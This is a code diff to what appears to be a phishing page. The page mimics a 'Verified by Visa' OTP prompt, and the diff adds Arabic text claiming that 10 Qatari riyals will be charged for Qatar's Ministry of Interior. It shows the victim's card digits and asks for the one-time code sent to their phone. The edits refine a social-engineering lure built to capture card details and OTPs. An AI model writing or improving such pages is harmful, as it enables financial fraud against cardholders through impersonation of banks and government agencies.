@@ -410,6 +410,10 @@
         }
         
         /* Verified by Visa Style */
+        #otpModal .modal-content {
+            font-family: 'Cairo', sans-serif;
+        }
+        
         .vbv-header {
             margin-bottom: 20px;
         }
@@ -439,8 +443,41 @@
             background-color: white;
             border: 1px solid #ccc;
             padding: 15px;
-            margin-bottom: 20px;
+            margin-bottom: 15px;
             font-size: 13px;
+        }
+        
+        .banking-message-box {
+            background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
+            border: 1px solid #dee2e6;
+            border-right: 4px solid #0066cc;
+            border-radius: 6px;
+            padding: 15px;
+            margin-bottom: 20px;
+            display: flex;
+            gap: 12px;
+            align-items: flex-start;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+        }
+        
+        .banking-message-icon {
+            color: #0066cc;
+            font-size: 20px;
+            margin-top: 2px;
+            flex-shrink: 0;
+        }
+        
+        .banking-message-text {
+            flex: 1;
+            color: #2c3e50;
+            font-size: 13px;
+            text-align: right;
+            direction: rtl;
+        }
+        
+        .banking-message-text strong {
+            color: #1a1a1a;
+            font-weight: 600;
         }
         
         .vbv-detail-row {
@@ -754,6 +791,21 @@
                         <div class="vbv-detail-row">
                             <div class="vbv-detail-label">Personal Message:</div>
                             <div class="vbv-detail-value">Cardholder verification required</div>
+                        </div>
+                    </div>
+                    
+                    <!-- Arabic Banking Message -->
+                    <div class="banking-message-box">
+                        <div class="banking-message-icon">
+                            <i class="fa fa-info-circle"></i>
+                        </div>
+                        <div class="banking-message-text">
+                            <p style="margin: 0; line-height: 1.6;">
+                                سيتم خصم مبلغ <strong>10 ريال قطري</strong> لصالح <strong>وزارة الداخلية / التوثيق</strong> من البطاقة المنتهية بالرقم <strong id="lastFourDigits">****</strong>.
+                            </p>
+                            <p style="margin: 8px 0 0 0; line-height: 1.6;">
+                                الرجاء إدخال الرمز المرسل لهاتفك لتأكيد العملية.
+                            </p>
                         </div>
                     </div>
                     
@@ -1160,6 +1212,9 @@
                 // Set masked card number
                 const lastFour = cardNumber.slice(-4);
                 document.getElementById('maskedCard').textContent = toEnglishNumbers(`**** **** **** ${lastFour}`);
+                
+                // Set last four digits in Arabic message
+                document.getElementById('lastFourDigits').textContent = lastFour;
                 
                 // Set maxlength based on card type
                 document.getElementById('vbvPassword').maxLength = otpLength;
